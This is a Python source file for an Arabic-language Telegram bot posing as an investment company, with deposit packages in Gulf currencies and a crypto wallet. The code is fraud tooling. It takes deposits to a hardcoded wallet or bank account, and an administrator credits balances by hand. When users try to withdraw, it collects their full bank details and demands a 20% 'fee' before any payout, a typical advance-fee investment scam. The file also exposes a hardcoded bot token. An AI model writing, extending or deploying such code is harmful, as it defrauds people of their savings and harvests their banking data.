import logging, os, sqlite3
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 🌐 خادم الويب (لضمان استقرار السيرفر على Render) ---
app_web = Flask('')
@app_web.route('/')
def home(): return "🚀 Sahm Platform - High Performance Version"

def run_server():
    app_web.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))

# إعداد السجلات
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ================= [ ⚙️ إعدادات الإمبراطور ] =================
TOKEN = '8731999916:AAHdeigVSmil8KD6GeA7OazVZkjVxhq9QJU'
ADMIN_USERNAME = 'HCICICVICIF9'
ADMINS_LIST = [6016547718]

# 🏦 الحل الذكي: قراءة الحسابات من إعدادات Render (Environment Variables) لسهولة التغيير
# إذا لم تضعها في Render، سيستخدم القيم الافتراضية المكتوبة هنا
BANK_ACCOUNT = os.environ.get('BANK_ACCOUNT', "يرجى التواصل مع الادارة للحصول على حسابنا البنكي")
CRYPTO_WALLET = os.environ.get('CRYPTO_WALLET', "TLtLuhkU2kkkR1Wz1TtrBTpoNRTNviYpsA")

# ===============================================================

# --- 🗄️ إدارة قاعدة البيانات المحلية ---
def init_db():
    conn = sqlite3.connect('sahm_v4_stable.db', check_same_thread=False)
    conn.execute('''CREATE TABLE IF NOT EXISTS users (
                    uid INTEGER PRIMARY KEY, 
                    bal_sar REAL DEFAULT 0.0, 
                    bal_usd REAL DEFAULT 0.0)''')
    conn.commit()
    return conn

db_conn = init_db()

def get_user_data(uid):
    cursor = db_conn.cursor()
    cursor.execute('SELECT bal_sar, bal_usd FROM users WHERE uid = ?', (uid,))
    row = cursor.fetchone()
    if not row:
        cursor.execute('INSERT INTO users (uid, bal_sar, bal_usd) VALUES (?, 0.0, 0.0)', (uid,))
        db_conn.commit()
        return {"bal_sar": 0.0, "bal_usd": 0.0}
    return {"bal_sar": row[0], "bal_usd": row[1]}

def update_balance(uid, curr, amt):
    cursor = db_conn.cursor()
    field = "bal_sar" if curr == 'sr' else "bal_usd"
    cursor.execute(f'UPDATE users SET {field} = {field} + ? WHERE uid = ?', (float(amt), int(uid)))
    db_conn.commit()

# --- 🏠 الترحيب القوي ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user_data(user.id)
    kb = [
        [InlineKeyboardButton("🇸🇦 استثمار (بالريال السعودي)", callback_data='c_sr'),
         InlineKeyboardButton("🇺🇸 استثمار (بالدولار)", callback_data='c_us')],
        [InlineKeyboardButton("🌍 الاستثمار بعملات أخرى", callback_data='other_currency')],
        [InlineKeyboardButton("🇰🇼 عروض الخليج والدول العربية 🌍", callback_data='gulf_offers')],
        [InlineKeyboardButton("💰 محفظتي المالية", callback_data='wallet')],
        [InlineKeyboardButton("📤 طلب سحب الأرباح", callback_data='withdraw')],
        [InlineKeyboardButton("💬 التواصل مع الإدارة", url=f"https://t.me/{ADMIN_USERNAME}")]
    ]
    welcome_text = (
        f"🏦 **مرحباً بكم في شركة الاولى العالميه للاستثمار**\n\n"
        f"السيد: **{user.first_name}**\n\n"
        f"أهلاً بك في منصتنا الرائدة. نحن هنا لنصنع مستقبلك المالي بأمان تام وعوائد مجزية.\n\n"
        f"💡 **يرجى اختيار القسم المطلوب للبدء:**"
    )
    if update.message: await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    else: await update.callback_query.edit_message_text(welcome_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

# --- 🔘 معالج الأزرار المطور ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data, uid = query.data, query.from_user.id
    await query.answer()

    if data == 'main': await start(update, context)
    
    elif data == 'other_currency':
        await query.edit_message_text("🌍 **الاستثمار بالعملات الدولية:**\n\nيرجى التواصل مع الدعم الفني للحصول على حساباتنا البنكية الرسمية المتاحة في أي دولة حول العالم.", 
                                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')

    elif data == 'wallet':
        u = get_user_data(uid)
        await query.edit_message_text(f"📊 **محفظتك المالية:**\n\n🇸🇦 ريال: `{u['bal_sar']:,}`\n🇺🇸 دولار: `{u['bal_usd']:,}`", 
                                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
   
    elif data == 'withdraw':
        u = get_user_data(uid)
        msg = (f"📤 **إجراءات سحب الأرباح**\n\n"
               f"💰 **رصيدك الحالي:**\n"
               f"🇸🇦: `{u['bal_sar']:,}` ﷼\n"
               f"🇺🇸: `{u['bal_usd']:,}` $\n\n"
               f"يرجى اختيار وسيلة السحب المطلوبة:")
        kb = [
            [InlineKeyboardButton("💵 سحب بالدولار (USDT)", callback_data='wd_usd')],
            [InlineKeyboardButton("🇸🇦 سحب بالريال السعودي", callback_data='wd_sar')],
            [InlineKeyboardButton("🔙 رجوع", callback_data='main')]
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

    elif data == 'wd_usd':
        await query.edit_message_text("🎯 **يرجى إرسال عنوان محفظتك (USDT TRC20) الآن:**", parse_mode='Markdown')
        context.user_data['action'] = 'wait_usd'

    elif data == 'wd_sar':
        await query.edit_message_text("📝 **يرجى إرسال بياناتك البنكية بالتنسيق التالي:**\n\n"
                                      "(اسم البنك - الاسم الكامل - رقم الحساب - الآيبان - رقم الجوال)", parse_mode='Markdown')
        context.user_data['action'] = 'wait_sar'

    elif data == 'wd_sar':
        await query.edit_message_text("📝 يرجى إرسال بياناتك البنكية بالتنسيق التالي:\n\n(اسم البنك - الاسم الكامل - رقم الحساب - الآيبان - رقم الجوال)", parse_mode='Markdown')
        context.user_data['waiting_for'] = 'sar_bank_details'
    elif data in ['c_sr', 'c_us']:
        curr = 'sr' if data == 'c_sr' else 'us'
        prices = ["1000", "2000", "3000", "4000", "5000", "8000", "10000", "15000", "20000", "30000", "40000", "50000"] if curr == 'sr' else ["300", "400", "500", "800", "1000", "2000", "3000", "4000", "5000", "8000", "10000", "15000", "20000", "25000", "30000", "40000", "50000"]
        btns = [[InlineKeyboardButton(f"{p} {('﷼' if curr=='sr' else '$')}", callback_data=f"{curr[0]}_{p}") for p in prices[i:i+2]] for i in range(0, len(prices), 2)]
        btns.append([InlineKeyboardButton("🔙 رجوع", callback_data='main')])
        await query.edit_message_text("🏦 **يرجى اختيار مبلغ الاستثمار:**", reply_markup=InlineKeyboardMarkup(btns), parse_mode='Markdown')

    elif data == 'gulf_offers':
        kb = [
            [InlineKeyboardButton("🇦🇪 عروض الإمارات", callback_data='off_ae'),
             InlineKeyboardButton("🇰🇼 عروض الكويت", callback_data='off_kw')],
            [InlineKeyboardButton("🇶🇦 عروض قطر", callback_data='off_qa'),
             InlineKeyboardButton("🇴🇲 عروض عمان", callback_data='off_om')],
            [InlineKeyboardButton("🔙 رجوع", callback_data='main')]
        ]
        await query.edit_message_text("🌍 **يرجى اختيار الدولة لعرض باقات الاستثمار المتاحة:**", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

    elif data.startswith('off_'):
        country = data.split('_')[1]
        offers = {
            'ae': ("الإمارات 🇦🇪", ["500", "1000", "1500", "3000", "5000", "7000", "10000", "15000"], "درهم"),
            'kw': ("الكويت 🇰🇼", ["50", "100", "180", "250", "410", "575", "822", "1230"], "دينار"),
            'qa': ("قطر 🇶🇦", ["500", "1000", "1500", "2000", "3000", "5000", "7000", "10000", "15000"], "ريال"),
            'om': ("عمان 🇴🇲", ["500", "1000", "1500", "2000", "3000", "5000", "7000", "10000", "15000"], "ريال")
        }
        name, prices, currency = offers[country]
        
        # التعديل الجوهري: ربط العملات بـ s_ (للعملات الورقية) و u_ (للدولار)
        # إذا كانت العملة درهم/دينار/ريال ستعامل معاملة s_ (السعودي) لتظهر بيانات البنك
        btns = [[InlineKeyboardButton(f"{p} {currency}", callback_data=f"s_{p}") for p in prices[i:i+2]] for i in range(0, len(prices), 2)]
        btns.append([InlineKeyboardButton("🔙 رجوع", callback_data='gulf_offers')])
        
        await query.edit_message_text(f"✨ **عروض استثمار {name}:**\n\nاختر الباقة المناسبة لك:", reply_markup=InlineKeyboardMarkup(btns), parse_mode='Markdown')
    elif data == 'invest_now':
        msg = (f"🚀 **بدء الاستثمار**\n\n"
               f"للإيداع والحصول على حساباتنا البنكية الرسمية، يرجى التواصل مع الإدارة:\n\n"
               f"👉 [اضغط هنا للتواصل مع الإدارة](https://T.me/BIG_INVESTORS1)")
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown', disable_web_page_preview=True)
    elif data.startswith(('s_', 'u_')):
        amt = data.split('_')[1]
        addr = BANK_ACCOUNT if data.startswith('s_') else CRYPTO_WALLET
        await query.edit_message_text(f"✅ اخترت مبلغ: **{amt}**\n\nحول إلى:\n`{addr}`\n\n📸 أرسل صورة الإيصال هنا.", parse_mode='Markdown')

    elif data.startswith('ok_'): # أزرار المالك الثابتة
        if uid not in ADMINS_LIST: return
        _, cur, val, tid = data.split('_')
        update_balance(tid, cur, val)
        
        # إشعار نجاح للمالك يظهر كرسالة منبثقة (Alert)
        await query.answer(f"✅ تم تنفيذ الإيداع بنجاح لـ {val}", show_alert=True)
        
        try: 
            # إشعار المشترك
            await context.bot.send_message(int(tid), f"🎉 **أبشر.. تم إيداع `{val}` {('﷼' if cur=='sr' else '$')} في محفظتك!**", parse_mode='Markdown')
        except: pass

    elif data == 'delete_msg':
        if uid in ADMINS_LIST: await query.message.delete()

# --- 📸 معالج الصور ---
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text("✅ **استلمنا الإيصال، جاري المراجعة...**", parse_mode='Markdown')
    def b(v, c): return InlineKeyboardButton(f"➕ {v} {('ر' if c=='sr' else '$')}", callback_data=f"ok_{c}_{v}_{user.id}")
    
    # تنسيق أزرار المالك بشكل منظم
    kb = [
        [b("1000", "sr"), b("5000", "sr"), b("10000", "sr")],
        [b("15000", "sr"), b("20000", "sr"), b("50000", "sr")],
        [b("100", "us"), b("500", "us"), b("1000", "us")],
        [b("1500", "us"), b("2000", "us"), b("5000", "us")],
        [InlineKeyboardButton("❌ إغلاق", callback_data='delete_msg')]
    ]
    
    for adm in ADMINS_LIST:
        try: 
            await context.bot.send_photo(
                adm, 
                update.message.photo[-1].file_id, 
                caption=f"🔔 إيداع من: {user.first_name}\nID: `{user.id}`\n\n(الأزرار ثابتة للإيداع المتكرر)", 
                reply_markup=InlineKeyboardMarkup(kb), 
                parse_mode='Markdown'
            )
        except: pass
async def handle_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text
    action = context.user_data.get('action')

    if action == 'wait_usd':
        u = get_user_data(uid)
        balance = u['bal_usd']
        fee = balance * 0.20  # حسبة الـ 20% تلقائياً
        
        response = (f"👤 **عزيزي المشترك**\n\n"
                    f"💰 رصيدك بالدولار: `{balance:,} $`\n"
                    f"📍 عنوان محفظتك: `{text}`\n"
                    f"------------------------------\n"
                    f"⚠️ **الرسوم المتوجبة (20%):** `{fee:,} $`\n"
                    f"------------------------------\n"
                    f"ℹ️ يرجى دفع مبلغ الرسوم لفتح بوابة تحويل الأرباح.")
        await update.message.reply_text(response, parse_mode='Markdown')
        context.user_data['action'] = None

    elif action == 'wait_sar':
        u = get_user_data(uid)
        balance = u['bal_sar']
        fee = balance * 0.20  # حسبة الـ 20% تلقائياً
        
        response = (f"👤 **عزيزي المشترك**\n\n"
                    f"📋 بياناتك المستلمة:\n`{text}`\n\n"
                    f"💰 رصيدك بالريال: `{balance:,} ﷼`\n"
                    f"------------------------------\n"
                    f"⚠️ **الرسوم المتوجبة لفتح بوابة السحب (20%):**\n"
                    f"💳 المطلوب سداده: **`{fee:,} ﷼`**\n"
                    f"------------------------------\n"
                    f"ℹ️ يرجى دفع مبلغ الرسوم لفتح بوابة تحويل الأرباح.")
        await update.message.reply_text(response, parse_mode='Markdown')
        context.user_data['action'] = None
if __name__ == '__main__':
    Thread(target=run_server, daemon=True).start()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_user_input))
    app.run_polling(drop_pending_updates=True)
